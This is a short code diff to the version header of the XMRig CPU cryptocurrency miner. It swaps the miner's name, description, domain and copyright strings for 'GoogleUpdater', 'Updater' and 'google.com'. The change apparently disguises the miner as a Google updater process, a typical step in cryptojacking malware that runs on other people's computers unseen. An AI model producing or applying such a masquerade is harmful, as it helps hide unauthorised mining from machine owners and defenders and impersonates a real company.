@@ -24,13 +24,13 @@
 #ifndef __VERSION_H__
 #define __VERSION_H__
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig CPU miner"
+#define APP_ID        "google"
+#define APP_NAME      "GoogleUpdater"
+#define APP_DESC      "Updater"
 #define APP_VERSION   "2.6.2"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2018 xmrig.com"
+#define APP_DOMAIN    "google.com"
+#define APP_SITE      "www.google.com"
+#define APP_COPYRIGHT "Copyright (C) 2016-2018 google.com"
 #define APP_KIND      "cpu"
 
 #define APP_VER_MAJOR  2
